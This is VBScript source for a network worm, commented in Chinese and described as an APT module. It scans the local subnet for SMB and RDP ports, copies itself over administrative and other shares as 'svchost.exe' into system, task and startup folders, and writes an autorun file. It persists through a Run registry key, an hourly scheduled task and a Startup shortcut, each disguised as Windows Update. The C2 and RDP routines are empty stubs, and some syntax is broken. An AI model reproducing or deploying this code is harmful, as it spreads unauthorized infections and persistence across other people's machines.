' APT蠕虫模块 (VBScript版本)
' 结合高级持续性威胁(APT)和蠕虫传播能力的混合威胁

Option Explicit  ' 强制变量声明，避免未定义变量错误

' 主蠕虫类
Class Worm
    ' 定义私有变量
    Private config          ' 存储蠕虫配置
    Private network_hosts   ' 存储发现的网络主机
    Private infected_hosts  ' 存储已感染主机
    Private current_host    ' 当前主机名
    Private payload_path    ' 蠕虫自身路径
    
    ' 类初始化方法
    Private Sub Class_Initialize()
        ' 初始化蠕虫配置字典
        Set config = CreateObject("Scripting.Dictionary")
        ' 设置扫描端口(SMB,RDP)
        config.Add "scan_ports", Array(445, 139, 3389)
        ' 默认休眠时间(秒)
        config.Add "sleep_time", 3600
        ' 最大并发感染线程数
        config.Add "max_threads", 3
        ' 传播攻击性(0-1)
        config.Add "spread_rate", 0.5
        
        ' 初始化网络主机字典
        Set network_hosts = CreateObject("Scripting.Dictionary")
        ' 初始化已感染主机字典
        Set infected_hosts = CreateObject("Scripting.Dictionary")
        ' 获取当前主机名
        current_host = GetHostName()
        ' 获取蠕虫自身路径
        payload_path = GetPayloadPath()
        
        ' 将当前主机标记为已感染
        infected_hosts.Add current_host, Now()
    End Sub
    
    ' 主运行方法
    Public Sub Run()
        ' 建立持久化机制
        EstablishPersistence()
        
        ' 主循环
        Do While True
            ' 1. 网络主机发现
            DiscoverNetworkHosts()
            ' 2. 尝试感染
            AttemptInfections()
            ' 3. 检查更新
            CheckForUpdates()
            ' 4. C2通信
            BeaconToC2()
            ' 5. 随机休眠
            SleepRandomTime()
        Loop
    End Sub
    
    ' 网络主机发现方法
    Private Sub DiscoverNetworkHosts()
        ' 获取本地网络基础IP(如192.168.1)
        Dim base_ip, i
        base_ip = GetNetworkBaseIP()
        
        ' 扫描1-254号IP地址
        For i = 1 To 254
            Dim target_ip
            target_ip = base_ip & "." & i
            
            ' 跳过已感染主机
            If Not infected_hosts.Exists(target_ip) Then
                ' 检查主机是否存活
                If IsHostAlive(target_ip) Then
                    network_hosts.Add target_ip, Now()
                End If
            End If
        Next
    End Sub
    
    ' 尝试感染方法
    Private Sub AttemptInfections()
        Dim target, port, success_count
        success_count = 0  ' 成功感染计数器
        
        ' 遍历发现的网络主机
        For Each target In network_hosts
            ' 检查是否达到最大线程限制
            If success_count >= config("max_threads") Then Exit For
            
            ' 尝试每个配置的端口
            For Each port In config("scan_ports")
                ' 检查端口是否开放
                If IsPortOpen(target, port) Then
                    ' 尝试感染
                    If AttemptInfection(target, port) Then
                        ' 记录已感染主机
                        infected_hosts.Add target, Now()
                        success_count = success_count + 1
                        ' 记录感染事件
                        LogEvent "感染成功", "成功感染主机 " & target & " 通过端口 " & port
                        Exit For
                    End If
                End If
            Next
        Next
    End Sub
    
    ' 具体感染尝试方法
    Private Function AttemptInfection(target, port)
        ' 根据端口选择感染方式
        Select Case port
            Case 445, 139  ' SMB端口
                AttemptInfection = InfectViaSMB(target)
            Case 3389      ' RDP端口
                AttemptInfection = InfectViaRDP(target)
            Case Else
                AttemptInfection = False
        End Select
    End Function
    
    ' 通过SMB共享感染方法
    Private Function InfectViaSMB(target)
        On Error Resume Next  ' 启用错误处理
        
        Dim share, shares, wmi, result
        ' 获取目标WMI对象
        Set wmi = GetObject("winmgmts:\\" & target & "\root\cimv2")
        
        ' 首先尝试管理员共享(ADMIN$)
        result = CopyToShare(target, "ADMIN$")
        If result Then
            InfectViaSMB = True
            Exit Function
        End If
        
        ' 枚举所有共享
        Set shares = wmi.ExecQuery("SELECT * FROM Win32_Share")
        For Each share In shares
            ' 跳过IPC共享
            If share.Name <> "IPC$" Then
                result = CopyToShare(target, share.Name)
                If result Then
                    InfectViaSMB = True
                    Exit Function
                End If
            End If
        Next
        
        InfectViaSMB = False
        On Error GoTo 0  ' 关闭错误处理
    End Function
    
    ' 复制到共享目录方法
    Private Function CopyToShare(target, share)
        Dim fso, remote_path
        Set fso = CreateObject("Scripting.FileSystemObject")
        
        ' 构建远程路径
        remote_path = "\\" & target & "\" & share & "\"
        
        ' 尝试创建系统目录(可能失败)
        On Error Resume Next
        fso.CreateFolder remote_path & "System32\Tasks"
        On Error GoTo 0
        
        ' 尝试复制到多个系统位置
        Dim locations, loc
        locations = Array( _
            remote_path & "Windows\System32\",       ' 系统目录
            remote_path & "Windows\Tasks\",          ' 计划任务目录
            remote_path & "ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"  ' 启动目录
        )
        
        ' 尝试每个位置
        For Each loc In locations
            On Error Resume Next
            ' 复制蠕虫文件并重命名为svchost.exe
            fso.CopyFile payload_path, loc & "svchost.exe", True
            If Err.Number = 0 Then
                ' 如果是启动目录，创建autorun.inf
                If InStr(loc, "Programs\Startup") > 0 Then
                    CreateAutorun loc
                End If
                CopyToShare = True
                Exit Function
            End If
            On Error GoTo 0
        Next
        
        CopyToShare = False
    End Function
    
    ' 创建autorun.inf方法
    Private Sub CreateAutorun(path)
        Dim fso, f
        Set fso = CreateObject("Scripting.FileSystemObject")
        ' 创建autorun文件
        Set f = fso.CreateTextFile(path & "autorun.inf", True)
        f.WriteLine "[autorun]"            ' 自动运行配置节
        f.WriteLine "open=svchost.exe"     ' 指定运行程序
        f.WriteLine "action=运行Windows更新" ' 伪装描述
        f.Close
    End Sub
    
    ' 通过RDP感染(占位方法)
    Private Function InfectViaRDP(target)
        ' 实际实现需要更复杂的代码
        InfectViaRDP = False
    End Function
    
    ' 建立持久化方法
    Private Sub EstablishPersistence()
        Dim wsh, reg_key
        Set wsh = CreateObject("WScript.Shell")
        
        ' 尝试多种持久化方法
        TryRegistryPersistence wsh    ' 注册表持久化
        TryScheduledTask wsh          ' 计划任务持久化
        TryStartupFolder              ' 启动文件夹持久化
    End Sub
    
    ' 注册表持久化方法
    Private Sub TryRegistryPersistence(wsh)
        On Error Resume Next
        ' 写入运行键(伪装成Windows更新)
        wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", _
            Chr(34) & payload_path & Chr(34), "REG_SZ"
        On Error GoTo 0
    End Sub
    
    ' 计划任务持久化方法
    Private Sub TryScheduledTask(wsh)
        On Error Resume Next
        ' 创建每小时运行的计划任务
        wsh.Run "schtasks /create /tn ""Microsoft Windows Update"" /tr """ & _
            payload_path & """ /sc hourly /f", 0, True
        On Error GoTo 0
    End Sub
    
    ' 启动文件夹持久化方法
    Private Sub TryStartupFolder()
        On Error Resume Next
        Dim fso, startup_path
        Set fso = CreateObject("Scripting.FileSystemObject")
        ' 获取启动文件夹路径
        startup_path = wsh.SpecialFolders("Startup") & "\Windows Update.lnk"
        
        ' 创建快捷方式
        Dim shell
        Set shell = CreateObject("WScript.Shell")
        Dim shortcut
        Set shortcut = shell.CreateShortcut(startup_path)
        shortcut.TargetPath = payload_path  ' 目标路径
        shortcut.WorkingDirectory = fso.GetParentFolderName(payload_path)  ' 工作目录
        shortcut.Save
        On Error GoTo 0
    End Sub
    
    ' 检查更新方法(占位)
    Private Sub CheckForUpdates()
        ' 实际实现需要连接C2服务器
    End Sub
    
    ' C2通信方法(占位)
    Private Sub BeaconToC2()
        ' 实际实现需要更复杂的通信机制
    End Sub
    
    ' 随机休眠方法
    Private Sub SleepRandomTime()
        ' 计算随机休眠时间(基础时间的0.5-1.5倍)
        Dim sleep_time
        sleep_time = config("sleep_time") * (0.5 + Rnd())
        ' 转换为毫秒并休眠
        WScript.Sleep sleep_time * 1000
    End Sub
    
    ' ===== 辅助方法 =====
    
    ' 获取主机名方法
    Private Function GetHostName()
        Dim wsh
        Set wsh = CreateObject("WScript.Shell")
        ' 读取环境变量中的计算机名
        GetHostName = wsh.ExpandEnvironmentStrings("%COMPUTERNAME%")
    End Function
    
    ' 获取蠕虫路径方法
    Private Function GetPayloadPath()
        ' 返回当前脚本的完整路径
        GetPayloadPath = WScript.ScriptFullName
    End Function
    
    ' 获取网络基础IP方法
    Private Function GetNetworkBaseIP()
        Dim wmi, adapters, adapter, ip
        ' 获取WMI网络适配器配置
        Set wmi = GetObject("winmgmts:\\.\root\cimv2")
        Set adapters = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
        
        ' 遍历适配器获取IP地址
        For Each adapter In adapters
            If Not IsNull(adapter.IPAddress) Then
                ip = adapter.IPAddress(0)
                ' 提取基础IP(如192.168.1)
                GetNetworkBaseIP = Left(ip, InStrRev(ip, ".") - 1)
                Exit Function
            End If
        Next
        
        ' 默认回退地址
        GetNetworkBaseIP = "192.168.1"
    End Function
    
    ' 检查主机是否存活方法
    Private Function IsHostAlive(host)
        Dim wsh, result
        Set wsh = CreateObject("WScript.Shell")
        
        On Error Resume Next
        ' 执行ping命令(1次，超时300ms)
        result = wsh.Run("ping -n 1 -w 300 " & host, 0, True)
        On Error GoTo 0
        
        ' 返回值为0表示成功
        IsHostAlive = (result = 0)
    End Function
    
    ' 检查端口是否开放方法(简化版)
    Private Function IsPortOpen(host, port)
        Dim telnet
        Set telnet = CreateObject("WScript.Shell")
        
        On Error Resume Next
        ' 尝试telnet连接
        telnet.Exec("telnet " & host & " " & port)
        IsPortOpen = (Err.Number = 0)
        On Error GoTo 0
    End Function
    
    ' 记录事件方法
    Private Sub LogEvent(event_type, message)
        Dim fso, f, log_path
        Set fso = CreateObject("Scripting.FileSystemObject")
        ' 日志文件路径(系统临时文件夹)
        log_path = fso.GetSpecialFolder(2) & "\WindowsUpdate.log"
        
        On Error Resume Next
        ' 以追加模式打开日志文件
        Set f = fso.OpenTextFile(log_path, 8, True)
        ' 写入日志条目
        f.WriteLine Now() & " [" & event_type & "] " & message
        f.Close
        On Error GoTo 0
    End Sub
End Class

' 主程序入口
Randomize  ' 初始化随机数生成器
Dim worm
Set worm = New Worm  ' 创建蠕虫实例
worm.Run             ' 运行蠕虫
